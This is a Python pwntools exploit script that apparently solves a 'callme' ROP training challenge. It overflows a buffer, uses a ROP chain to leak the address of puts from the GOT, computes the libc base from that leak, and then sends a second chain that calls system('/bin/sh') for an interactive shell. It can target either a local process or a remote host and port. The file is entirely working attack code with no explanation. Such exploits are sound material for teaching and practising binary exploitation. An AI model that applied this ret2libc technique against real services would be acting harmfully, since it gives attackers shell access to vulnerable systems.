from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./callme"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()
offset = 40
libc = elf.libc

pop_rdi = ROP(exe).find_gadget(["pop rdi", "ret"])[0]

payload = flat({offset: [pop_rdi, elf.got.puts, elf.plt.puts, elf.sym["pwnme"]]})

io.sendlineafter(b"> ", payload)
io.recvuntil(b"Thank you!\n")

got_puts = unpack(io.recvline()[:-1].ljust(8, b"\x00"))

log.info(f"GOT PUTS Leak : {hex(got_puts)}")
libc.address = got_puts - libc.sym["puts"]

log.info(f"LIBC Base : {hex(libc.address)}")


payload = flat(
    {
        offset: [
            pop_rdi + 1,
            pop_rdi,
            next(libc.search(b"/bin/sh\x00")),
            libc.sym["system"],
        ]
    }
)

io.sendline(payload)

io.interactive()
